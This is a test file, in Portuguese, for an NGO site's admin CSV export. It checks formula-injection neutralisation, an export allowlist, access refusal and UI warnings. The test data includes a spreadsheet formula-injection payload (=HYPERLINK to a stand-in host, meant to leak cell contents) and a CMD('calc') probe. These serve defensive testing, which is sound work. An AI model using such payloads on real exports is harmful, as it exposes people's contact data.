/**
 * RF31 — a exportação em CSV: `/admin/exportar/<conjunto>`.
 *
 * ===================================================================
 * O QUE ESTE ARQUIVO EXISTE PARA GUARDAR
 * ===================================================================
 *
 * Uma coisa acima de todas: A PROTEÇÃO CONTRA INJEÇÃO DE FÓRMULA. O
 * formulário público de /contato grava texto de QUALQUER PESSOA em
 * `public.contatos` (acoes/contato.ts). Se esse texto sair num CSV sem
 * tratamento, ele deixa de ser texto no instante em que a equipe abre o
 * arquivo no Excel ou no LibreOffice: `=HYPERLINK(...)` no campo "nome"
 * vira uma fórmula avaliada na máquina de quem abriu, com as outras
 * células — nome, e-mail e telefone de todo mundo que escreveu para a ONG —
 * ao alcance.
 *
 * É o único lugar deste projeto onde o alvo do ataque não é o nosso
 * servidor, e sim o programa de quem recebe o arquivo. Por isso a
 * verificação é grosseira e repetida: cada caractere da lista tem seu
 * próprio assert, e há um teste que quebra se a LISTA encolher.
 *
 * ===================================================================
 * O QUE DÁ PARA MEDIR SEM SESSÃO DE EQUIPE, E O QUE NÃO DÁ
 * ===================================================================
 *
 * A rota está atrás de `ehEquipe()`, que responde 404 para todo mundo hoje
 * (CLAUDE.md, "O que trava hoje", itens 1 e 2). Então NENHUM teste aqui vê
 * um CSV servido de verdade. O que se mede:
 *
 *   1. o módulo puro (compartilhado/exportacao.ts), que é onde mora a parte
 *      perigosa — escape, aspas, injeção, nome do arquivo, lista fechada;
 *   2. a RECUSA por HTTP: anônimo recebe 404 e nada do arquivo vaza;
 *   3. o CÓDIGO-FONTE da rota e da camada de dados, por varredura: a guarda
 *      existe, a lista fechada é usada, e as colunas declaradas batem com as
 *      que o servidor produz;
 *   4. o componente que oferece os downloads, montado com a lista REAL.
 *
 * O caminho do sucesso — baixar o arquivo com uma sessão de equipe e abrir
 * numa planilha — continua sem medição, e está declarado no relatório da
 * tarefa em vez de escondido atrás de um teste que finge.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readdir, readFile } from 'node:fs/promises';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import {
  SEPARADOR, BOM_UTF8, FIM_DE_LINHA, PRIMEIROS_CARACTERES_DE_FORMULA, MARCA_DE_TEXTO,
  escaparCampoCsv, neutralizarFormula, citarSePreciso, montarCsv,
  CONJUNTOS_EXPORTAVEIS, ehConjuntoExportavel, conjuntoPorChave,
  nomeDoArquivo, dataParaPlanilha, rotuloDaCandidatura
} from '../compartilhado/exportacao.ts';
import { avisoDaExportacao } from '../compartilhado/avisos-do-painel.ts';
import {
  PainelExportacoes, CAMINHO_DA_EXPORTACAO,
  AVISO_DE_DADO_PESSOAL, AVISO_DO_APOSTROFO, AVISO_DE_PLANILHA
} from '../componentes/PainelExportacoes.ts';

const BASE = process.env.URL_BASE || 'http://localhost:3123';

// ---------------------------------------------------------------------
// 1. Injeção de fórmula — o motivo de este arquivo existir
// ---------------------------------------------------------------------

test('campo que começaria fórmula recebe a marca de texto — um caractere de cada vez', () => {
  for (const perigoso of PRIMEIROS_CARACTERES_DE_FORMULA) {
    const escapado = escaparCampoCsv(`${perigoso}CMD("calc")`);

    assert.ok(
      escapado.startsWith(MARCA_DE_TEXTO) || escapado.startsWith(`"${MARCA_DE_TEXTO}`),
      `um campo começando com ${JSON.stringify(perigoso)} saiu como ${JSON.stringify(escapado)}: `
      + 'sem a marca de texto, a planilha avalia isso como FÓRMULA na máquina de quem abrir'
    );
  }
});

test('a carga real: =HYPERLINK no campo "nome" não sai como fórmula', () => {
  // O texto vem do formulário público de /contato, escrito por alguém sem
  // conta. Este é o ataque, não um exemplo abstrato.
  const ataque = '=HYPERLINK("http://exemplo.invalido/?x="&A1;"clique aqui")';
  const escapado = escaparCampoCsv(ataque);

  assert.ok(escapado.includes(MARCA_DE_TEXTO + '=HYPERLINK'),
    `saiu ${JSON.stringify(escapado)} — a fórmula não foi neutralizada`);
  // E o `;` de dentro precisa continuar sem quebrar a linha em duas colunas.
  assert.ok(escapado.startsWith('"') && escapado.endsWith('"'),
    'o campo tem ponto-e-vírgula dentro e não foi citado: a linha inteira desalinha');
});

test('a lista de caracteres perigosos não pode encolher — tem os seis', () => {
  // Encurtar esta lista é reabrir o buraco, e é o tipo de "simplificação"
  // que passa numa revisão. TAB e CR estão aqui porque o Excel os descarta
  // ao importar e passa a olhar o caractere seguinte.
  for (const obrigatorio of ['=', '+', '-', '@', '\t', '\r']) {
    assert.ok(
      PRIMEIROS_CARACTERES_DE_FORMULA.includes(obrigatorio),
      `${JSON.stringify(obrigatorio)} saiu da lista de PRIMEIROS_CARACTERES_DE_FORMULA`
    );
  }
});

test('o telefone com + sai marcado, e isso é o custo aceito — não um defeito a corrigir', () => {
  // Está aqui para que a próxima pessoa que achar o apóstrofo feio encontre
  // a decisão escrita antes de removê-lo. O porquê está em
  // compartilhado/exportacao.ts, e a tela avisa a equipe.
  assert.equal(escaparCampoCsv('+55 11 95396-8344'), "'+55 11 95396-8344");
});

test('o = no MEIO do texto não é tocado — mexer nele mudaria o que a pessoa escreveu', () => {
  assert.equal(escaparCampoCsv('a soma a=b não é fórmula'), 'a soma a=b não é fórmula');
});

test('NÚMERO não recebe a marca: a exceção é por tipo, nunca por aparência', () => {
  // Um `number` veio de coluna numérica do Postgres, não de texto digitado.
  // Se a exceção fosse "parece número, deixa passar", `-1+CMD()` também
  // pareceria — e é por aí que a injeção volta.
  assert.equal(escaparCampoCsv(-1), '-1');
  assert.equal(escaparCampoCsv(0), '0');
  // A mesma coisa como STRING continua sendo neutralizada.
  assert.equal(escaparCampoCsv('-1'), "'-1");
});

test('a marca é acrescentada ANTES de citar — as duas proteções são independentes', () => {
  // Aspas NÃO protegem de fórmula: `"=1+1"` continua sendo avaliado na
  // importação. Este teste existe para impedir que alguém troque uma pela
  // outra achando que resolve.
  const so_citado = citarSePreciso('=1+1');
  assert.equal(so_citado, '=1+1', 'citarSePreciso não deve inventar aspas onde não precisa');

  assert.equal(neutralizarFormula('=1+1'), "'=1+1");
  assert.equal(escaparCampoCsv('=1;2'), '"\'=1;2"');
});

// ---------------------------------------------------------------------
// 2. Estrutura do arquivo: aspas, separador, vazio, booleano
// ---------------------------------------------------------------------

test('campo com ponto-e-vírgula, aspas ou quebra de linha é citado', () => {
  assert.equal(escaparCampoCsv('Escola Municipal; sala 3'), '"Escola Municipal; sala 3"');
  assert.equal(escaparCampoCsv('ela disse "oi"'), '"ela disse ""oi"""');
  assert.equal(escaparCampoCsv('primeira linha\nsegunda'), '"primeira linha\nsegunda"');
});

test('espaço na ponta é preservado por aspas — e-mail com espaço comido não funciona', () => {
  assert.equal(escaparCampoCsv(' contato@exemplo.org '), '" contato@exemplo.org "');
});

test('campo sem dado vira célula VAZIA, nunca a palavra "null" nem um traço', () => {
  assert.equal(escaparCampoCsv(null), '');
  assert.equal(escaparCampoCsv(undefined), '');
  assert.equal(escaparCampoCsv(''), '');
});

test('booleano vira sim/não, porque quem lê a planilha é a equipe', () => {
  assert.equal(escaparCampoCsv(true), 'sim');
  assert.equal(escaparCampoCsv(false), 'não');
});

test('o arquivo começa com BOM, separa com ; e termina cada linha com CRLF', () => {
  const csv = montarCsv(
    [{ chave: 'nome', titulo: 'Nome' }, { chave: 'email', titulo: 'E-mail' }],
    [{ nome: 'Ateliê', email: 'a@exemplo.org' }]
  );

  assert.ok(csv.startsWith(BOM_UTF8), 'sem BOM o Excel escreve "AteliÃª" no nome das pessoas');
  assert.ok(csv.includes(`Nome${SEPARADOR}E-mail`), 'o separador não é ponto-e-vírgula');
  assert.ok(csv.endsWith(FIM_DE_LINHA), 'a última linha não terminou em CRLF');
  // Sem linha em branco no fim: uma planilha lê isso como um registro vazio
  // e a equipe conta uma pessoa a mais.
  assert.doesNotMatch(csv, new RegExp(`${FIM_DE_LINHA}${FIM_DE_LINHA}$`));
});

test('chave que a linha não tem vira célula vazia, e a linha não desalinha', () => {
  const csv = montarCsv(
    [{ chave: 'a', titulo: 'A' }, { chave: 'b', titulo: 'B' }, { chave: 'c', titulo: 'C' }],
    [{ a: '1', c: '3' }]
  );

  const linhas = csv.split(FIM_DE_LINHA);
  assert.equal(linhas[1], `1${SEPARADOR}${SEPARADOR}3`);
});

test('montarCsv aplica o escape também no CABEÇALHO e nas células — não só na unidade', () => {
  const csv = montarCsv(
    [{ chave: 'nome', titulo: 'Nome; completo' }],
    [{ nome: '=1+1' }]
  );

  assert.ok(csv.includes('"Nome; completo"'), 'um título com ; desalinharia o arquivo inteiro');
  assert.ok(csv.includes("'=1+1"),
    'a fórmula passou pelo montarCsv sem a marca — o escape precisa valer no arquivo inteiro');
});

// ---------------------------------------------------------------------
// 3. A lista fechada de conjuntos
// ---------------------------------------------------------------------

test('só as chaves da lista são aceitas — e nada herdado de Object', () => {
  assert.equal(ehConjuntoExportavel('contatos'), true);
  assert.equal(ehConjuntoExportavel('voluntarios'), true);

  for (const invalido of ['perfis', 'doacoes', '', '__proto__', 'toString', 'constructor',
    null, undefined, 1, {}, ['contatos']]) {
    assert.equal(
      ehConjuntoExportavel(invalido), false,
      `${JSON.stringify(invalido)} passou pela lista fechada — o segmento da URL é entrada `
      + 'de usuário, e sem a lista ele acabaria escolhendo a consulta'
    );
  }

  assert.equal(conjuntoPorChave('__proto__'), null);
  assert.equal(conjuntoPorChave('perfis'), null);
});

test('cada conjunto tem chave única, colunas e um nome de arquivo só com ASCII', () => {
  const chaves = CONJUNTOS_EXPORTAVEIS.map((conjunto) => conjunto.chave);
  assert.equal(new Set(chaves).size, chaves.length, 'chave repetida na lista de conjuntos');

  for (const conjunto of CONJUNTOS_EXPORTAVEIS) {
    assert.ok(conjunto.colunas.length > 0, `${conjunto.chave} sem coluna nenhuma`);
    assert.ok(conjunto.rotulo.length > 0 && conjunto.descricao.length > 0,
      `${conjunto.chave} sem rótulo ou sem descrição — o link não diria o que baixa`);

    // Só ASCII: `filename` com acento exige a forma `filename*=UTF-8''...`,
    // e um cabeçalho malformado salva o arquivo como "download", sem
    // extensão, no celular de quem está de pé no meio de um evento.
    assert.match(conjunto.arquivo, /^[a-z0-9-]+$/,
      `o nome de arquivo de ${conjunto.chave} tem caractere fora do ASCII simples`);

    const chavesDeColuna = conjunto.colunas.map((coluna) => coluna.chave);
    assert.equal(new Set(chavesDeColuna).size, chavesDeColuna.length,
      `${conjunto.chave} repete uma chave de coluna — uma das duas nunca apareceria`);
  }
});

test('o nome do arquivo carrega a data, para dois downloads não virarem "mensagens(1).csv"', () => {
  const conjunto = conjuntoPorChave('contatos');
  assert.equal(nomeDoArquivo(conjunto, new Date(2026, 8, 1, 15, 30)), 'mensagens-2026-09-01.csv');
});

// ---------------------------------------------------------------------
// 4. Datas e rótulos
// ---------------------------------------------------------------------

test('a data sai no fuso de São Paulo, não em UTC — três horas mudam o dia', () => {
  // 2026-09-02T01:30Z é 22:30 do dia 1º em São Paulo. Sem o fuso, a equipe
  // leria uma mensagem da noite de ontem como se fosse de hoje.
  assert.equal(dataParaPlanilha('2026-09-02T01:30:00+00:00'), '01/09/2026, 22:30');
});

test('data que não dá para ler volta como veio — inventar uma seria pior', () => {
  assert.equal(dataParaPlanilha('nem-data-nem-nada'), 'nem-data-nem-nada');
  assert.equal(dataParaPlanilha(null), '');
  assert.equal(dataParaPlanilha(undefined), '');
});

test('a situação da candidatura vira palavra, e o valor desconhecido volta cru', () => {
  assert.equal(rotuloDaCandidatura('novo'), 'Nova');
  assert.equal(rotuloDaCandidatura('em_contato'), 'Em contato');
  assert.equal(rotuloDaCandidatura('ativo'), 'Ativa');
  assert.equal(rotuloDaCandidatura('inativo'), 'Inativa');
  assert.equal(rotuloDaCandidatura('arquivado'), 'arquivado');
  // `Object.hasOwn`: sem ele isto devolveria a função do protótipo.
  assert.equal(rotuloDaCandidatura('toString'), 'toString');
});

// ---------------------------------------------------------------------
// 5. A varredura que a de painel-guarda NÃO faz: route.ts sob app/admin/
// ---------------------------------------------------------------------

const DIRETORIO_ADMIN = fileURLToPath(new URL('../app/admin/', import.meta.url));

/** O código sem comentários — mesma função, e mesmo motivo, de painel-guarda. */
function semComentarios(codigo) {
  return codigo
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .split('\n')
    .filter((linha) => !linha.trim().startsWith('//'))
    .join('\n');
}

async function rotasDoPainel(diretorio = DIRETORIO_ADMIN, prefixo = 'app/admin') {
  const entradas = await readdir(diretorio, { withFileTypes: true });
  let encontradas = [];

  for (const entrada of entradas) {
    if (entrada.isDirectory()) {
      encontradas = encontradas.concat(
        await rotasDoPainel(join(diretorio, entrada.name), `${prefixo}/${entrada.name}`)
      );
    } else if (entrada.name === 'route.ts') {
      encontradas.push({
        rotulo: `${prefixo}/route.ts`,
        codigo: semComentarios(await readFile(join(diretorio, entrada.name), 'utf8'))
      });
    }
  }

  return encontradas;
}

test('todo route.ts sob app/admin/ chama ehEquipe() — o layout não envolve Route Handler', async () => {
  const rotas = await rotasDoPainel();

  assert.ok(rotas.length > 0,
    'nenhum route.ts encontrado em app/admin/ — o teste não verificou nada');

  const problemas = rotas
    .filter(({ codigo }) => !/ehEquipe\s*\(\s*\)/.test(codigo) || !/notFound\s*\(\s*\)/.test(codigo))
    .map(({ rotulo }) => rotulo);

  assert.deepEqual(
    problemas, [],
    'Route Handler do painel sem guarda:\n  ' + problemas.join('\n  ')
    + '\n  `app/admin/layout.tsx` NÃO envolve um route.ts: layout é do sistema de páginas.'
    + '\n  E a varredura de testes/painel-guarda.test.mjs procura page.tsx, não route.ts —'
    + '\n  é por isso que esta existe.'
  );
});

test('a rota de exportação usa a lista fechada, e não o segmento cru da URL', async () => {
  const codigo = semComentarios(await readFile(
    new URL('../app/admin/exportar/[conjunto]/route.ts', import.meta.url), 'utf8'));

  assert.match(codigo, /conjuntoPorChave\s*\(/,
    'a rota deixou de passar o segmento da URL pela lista fechada de compartilhado/exportacao.ts');
  assert.match(codigo, /cache-control['"]?\s*:\s*['"]no-store/,
    'sem `no-store` a CDN pode guardar um arquivo com a lista de contatos da ONG');
  assert.match(codigo, /content-disposition/,
    'sem Content-Disposition o CSV abre como texto na tela em vez de ser salvo');
  assert.match(codigo, /degradou/,
    'a rota precisa recusar o download quando a consulta falha — um CSV vazio AFIRMA que não '
    + 'há ninguém na lista');
});

// ---------------------------------------------------------------------
// 6. Reconciliação: as colunas declaradas existem do lado do servidor
// ---------------------------------------------------------------------

test('toda chave de coluna declarada é produzida por servidor/dados/exportacao.ts', async () => {
  // Trava grosseira, de propósito: uma coluna declarada aqui e não produzida
  // lá sai como uma coluna VAZIA na planilha — e coluna vazia num export não
  // parece defeito, parece dado que não existe.
  const codigo = await readFile(
    new URL('../servidor/dados/exportacao.ts', import.meta.url), 'utf8');

  const faltando = [];

  for (const conjunto of CONJUNTOS_EXPORTAVEIS) {
    for (const coluna of conjunto.colunas) {
      if (!new RegExp(`\\b${coluna.chave}\\s*:`).test(codigo)) {
        faltando.push(`${conjunto.chave} → ${coluna.chave}`);
      }
    }
  }

  assert.deepEqual(faltando, [],
    'coluna declarada em compartilhado/exportacao.ts e não montada em '
    + 'servidor/dados/exportacao.ts:\n  ' + faltando.join('\n  '));
});

test('toda chave da lista fechada tem um caso no switch do servidor', async () => {
  const codigo = await readFile(
    new URL('../servidor/dados/exportacao.ts', import.meta.url), 'utf8');

  for (const conjunto of CONJUNTOS_EXPORTAVEIS) {
    assert.match(
      codigo, new RegExp(`case '${conjunto.chave}'`),
      `"${conjunto.chave}" está na lista fechada e não tem de onde ler`
    );
  }
});

test('a exportação NÃO insere, NÃO atualiza e NÃO apaga — ela só lê', async () => {
  const codigo = semComentarios(await readFile(
    new URL('../servidor/dados/exportacao.ts', import.meta.url), 'utf8'));

  for (const escrita of ['.insert(', '.update(', '.delete(', '.upsert(']) {
    assert.ok(!codigo.includes(escrita),
      `servidor/dados/exportacao.ts faz ${escrita} — levar dados para fora não escreve nada`);
  }
});

// ---------------------------------------------------------------------
// 7. A recusa por HTTP, contra o servidor de verdade
// ---------------------------------------------------------------------

test('anônimo em /admin/exportar/contatos recebe 404 — não um 403 que conta que a rota existe', async () => {
  const resposta = await fetch(`${BASE}${CAMINHO_DA_EXPORTACAO}/contatos`, { redirect: 'manual' });

  assert.equal(resposta.status, 404,
    `respondeu ${resposta.status}: a guarda de app/admin/exportar/[conjunto]/route.ts abriu`);
});

test('nenhum byte de CSV sai para quem não é equipe', async () => {
  for (const conjunto of CONJUNTOS_EXPORTAVEIS) {
    const resposta = await fetch(`${BASE}${CAMINHO_DA_EXPORTACAO}/${conjunto.chave}`);
    const corpo = await resposta.text();

    assert.ok(!(resposta.headers.get('content-type') || '').includes('text/csv'),
      `${conjunto.chave} respondeu com content-type de CSV para requisição anônima`);
    assert.ok(!(resposta.headers.get('content-disposition') || '').includes('attachment'),
      `${conjunto.chave} mandou o navegador salvar um arquivo para quem não é equipe`);

    // O cabeçalho da planilha é a marca mais barata de "isto é o arquivo".
    const cabecalho = conjunto.colunas.map((coluna) => coluna.titulo).join(SEPARADOR);
    assert.ok(!corpo.includes(cabecalho),
      `o cabeçalho do CSV de ${conjunto.chave} apareceu na resposta servida a um anônimo`);
  }
});

test('conjunto fora da lista fechada é 404, como qualquer endereço que não existe', async () => {
  for (const inventado of ['perfis', 'doacoes', 'tudo']) {
    const resposta = await fetch(`${BASE}${CAMINHO_DA_EXPORTACAO}/${inventado}`);
    assert.equal(resposta.status, 404, `/admin/exportar/${inventado} respondeu ${resposta.status}`);
  }
});

// ---------------------------------------------------------------------
// 8. A tela que oferece os downloads
// ---------------------------------------------------------------------

function renderizarExportacoes(conjuntos = CONJUNTOS_EXPORTAVEIS) {
  return renderToStaticMarkup(createElement(PainelExportacoes, { conjuntos }));
}

test('cada conjunto vira um link para a rota dele, com rótulo e descrição dentro do <a>', () => {
  const html = renderizarExportacoes();

  for (const conjunto of CONJUNTOS_EXPORTAVEIS) {
    assert.match(
      html, new RegExp(`<a[^>]+href="${CAMINHO_DA_EXPORTACAO}/${conjunto.chave}"`),
      `não há link para baixar "${conjunto.chave}"`
    );
  }

  // O cartão inteiro é o alvo: no celular, de pé, o dedo não pode precisar
  // acertar a palavra (regra 4 do CLAUDE.md).
  const primeiroLink = html.match(/<a[^>]*>[\s\S]*?<\/a>/)[0];
  assert.ok(primeiroLink.includes(CONJUNTOS_EXPORTAVEIS[0].rotulo));
  assert.ok(primeiroLink.includes(CONJUNTOS_EXPORTAVEIS[0].descricao.slice(0, 30)));
});

test('a tela avisa que o arquivo tem dado pessoal, explica o apóstrofo e diz que é planilha', () => {
  const html = renderizarExportacoes();

  for (const [nome, aviso] of Object.entries({
    'dado pessoal': AVISO_DE_DADO_PESSOAL,
    'apóstrofo': AVISO_DO_APOSTROFO,
    'planilha': AVISO_DE_PLANILHA
  })) {
    assert.ok(html.includes(aviso.slice(0, 40)),
      `o aviso de ${nome} sumiu da tela — ver o cabeçalho de componentes/PainelExportacoes.ts`);
  }
});

test('o link do download não depende de JavaScript — é <a href>, sem onClick e sem botão', () => {
  const html = renderizarExportacoes();

  assert.doesNotMatch(html, /<button/,
    'um botão aqui só funcionaria com script; o download precisa ser um link comum');
  assert.doesNotMatch(html, /onclick/i, 'o download passou a depender de script');
});

test('o link NÃO tem o atributo download — ele estragaria o caminho da falha', () => {
  // Com `download`, o navegador salva o que voltar do endereço SEGUINDO
  // redirecionamentos: quando a rota recusa gerar o arquivo e responde 303
  // para /admin?aviso=exportacao-erro, a pessoa receberia o HTML do painel
  // salvo como arquivo, e o aviso nunca seria lido. Quem manda salvar é o
  // `Content-Disposition` do servidor, que é autoritativo.
  assert.doesNotMatch(renderizarExportacoes(), /\sdownload(=|\s|>)/,
    'o atributo download voltou — ver o cabeçalho de componentes/PainelExportacoes.ts');
});

test('sem conjunto nenhum a seção não é desenhada — título sem nada embaixo é pior que ausência', () => {
  assert.equal(renderizarExportacoes([]), '');
});

// ---------------------------------------------------------------------
// 9. O aviso de falha, por lista fechada
// ---------------------------------------------------------------------

test('o ?aviso= da exportação é lista fechada, e não ecoa o que vier na URL', () => {
  assert.ok(avisoDaExportacao('exportacao-erro')?.texto.length > 0);
  assert.equal(avisoDaExportacao('exportacao-erro').ok, false);

  for (const invalido of ['Sua conta foi bloqueada', '__proto__', 'toString', '', null, 7]) {
    assert.equal(
      avisoDaExportacao(invalido), null,
      `${JSON.stringify(invalido)} virou aviso — o painel passaria a exibir texto de fora`
    );
  }
});

test('não existe aviso de SUCESSO da exportação, e a ausência é deliberada', () => {
  // Quando o arquivo é gerado, a resposta É o arquivo: não há para onde
  // mandar um "pronto" sem tirar da equipe o próprio download. Se alguém
  // acrescentar um, este teste avisa que precisa haver um redirect junto —
  // senão a frase nunca apareceria.
  for (const chute of ['exportacao-ok', 'baixado', 'pronto', 'sucesso']) {
    assert.equal(avisoDaExportacao(chute), null);
  }
});
